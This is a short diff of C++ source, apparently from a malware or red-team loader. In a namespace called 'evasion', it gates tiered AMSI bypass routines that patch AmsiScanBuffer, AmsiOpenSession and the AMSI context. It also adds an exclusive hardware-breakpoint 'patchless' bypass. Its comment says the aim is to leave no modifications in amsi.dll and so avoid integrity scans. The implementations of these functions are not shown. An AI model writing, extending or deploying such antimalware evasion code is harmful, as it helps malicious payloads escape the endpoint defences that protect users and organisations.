@@ -186,14 +186,22 @@ namespace evasion {
         // -----------------------------------------------------------------
         // AMSI - tiered bypass controlled by CONFIG_AMSI_BYPASS_TYPE.
         // -----------------------------------------------------------------
-#if CONFIG_AMSI_BYPASS_TYPE >= 1
+#if CONFIG_AMSI_BYPASS_TYPE >= 1 && CONFIG_AMSI_BYPASS_TYPE != 4
         PatchAmsi();            // existing - patches AmsiScanBuffer
 #endif
-#if CONFIG_AMSI_BYPASS_TYPE >= 2
+#if CONFIG_AMSI_BYPASS_TYPE >= 2 && CONFIG_AMSI_BYPASS_TYPE != 4
         PatchAmsiOpenSession();
 #endif
-#if CONFIG_AMSI_BYPASS_TYPE >= 3
+#if CONFIG_AMSI_BYPASS_TYPE >= 3 && CONFIG_AMSI_BYPASS_TYPE != 4
         InvalidateAmsiContext();
+#endif
+        // Type 4 is exclusive - patchless HW-BP bypass replaces the byte
+        // patches above so the loader leaves zero modifications in
+        // amsi.dll. Combining with the byte patches would defeat the
+        // point (we'd still trip integrity scans) so we gate the others
+        // off when type == 4.
+#if CONFIG_AMSI_BYPASS_TYPE == 4
+        PatchlessAmsi();
 #endif
 
         // -----------------------------------------------------------------
